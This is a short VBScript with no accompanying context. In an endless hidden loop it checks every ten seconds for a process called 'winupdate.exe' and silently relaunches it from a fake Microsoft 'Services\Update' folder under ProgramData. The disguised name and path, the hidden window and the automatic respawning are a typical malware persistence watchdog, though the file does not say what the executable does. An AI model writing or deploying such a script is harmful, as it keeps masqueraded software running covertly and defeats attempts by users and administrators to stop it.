Set WshShell = CreateObject("WScript.Shell")
exePath = "C:\ProgramData\Microsoft\Services\Update\winupdate.exe"

Do
    WScript.Sleep 10000
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'winupdate.exe'")
    If colProcessList.Count = 0 Then
        WshShell.Run Chr(34) & exePath & Chr(34), 0, False
    End If
Loop

